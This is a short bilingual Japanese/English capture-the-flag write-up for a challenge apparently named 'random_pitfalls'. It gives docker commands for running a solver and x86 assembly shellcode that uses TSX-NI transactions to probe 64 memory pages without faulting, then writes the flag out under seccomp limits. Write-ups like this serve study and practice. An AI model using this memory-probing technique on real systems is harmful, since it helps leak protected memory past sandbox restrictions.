# ja
# 解き方
## ソルバー作成
cd solver
docker build -t random_pitfalls_solver .
## ソルバー起動
docker run -it --rm random_pitfalls_solver RHOST=${HOSTNAME}

## 解説
TSX-NIのトランザクションの最中にアクセスできないメモリ領域に触っても処理がabort
（トランザクション内の処理が無かったことになってxbeginで指定したラベルにジャンプ）
するだけでページフォルトは発生しないので、この特徴を利用して確保された64ページ全部をスキャンする。
具体的には↓みたいな感じでフラグを標準出力に吐き出せる。
writeの引数はseccompで決まった値しか許されていないことに要注意。
```
	mov rcx, 64
L1:
	xbegin L3
	mov rbx, 0
L2:
	mov rax, [rdi+8*rbx]
	xor [rsi+8*rbx], rax
	inc rbx
	cmp rbx, 5
	jne L2
	xend
L3:
	add rdi, 4096
	loop L1
	mov rax, 1
	mov rdi, 1
	mov rdx, 40
	syscall     /* write(1, buf, 40) */
	ret
```


# en

# writeup
## Create solver
cd solver
docker build -t random_pitfalls_solver .
## Solver start
docker run -it --rm random_pitfalls_solver RHOST=${HOSTNAME}

## Explanation
Even if you touch a memory area that cannot be accessed during the TSX-NI transaction, the process will only abort (jump to the label specified by xbegin because there was no processing in the transaction) and no page fault will occur. Scans all 64 pages secured using this feature.
Specifically, the flag can be discharged to the standard output like ↓.
Note that the write argument is only allowed by the value determined by seccomp.

```
	mov rcx, 64
L1:
	xbegin L3
	mov rbx, 0
L2:
	mov rax, [rdi+8*rbx]
	xor [rsi+8*rbx], rax
	inc rbx
	cmp rbx, 5
	jne L2
	xend
L3:
	add rdi, 4096
	loop L1
	mov rax, 1
	mov rdi, 1
	mov rdx, 40
	syscall     /* write(1, buf, 40) */
	ret
```
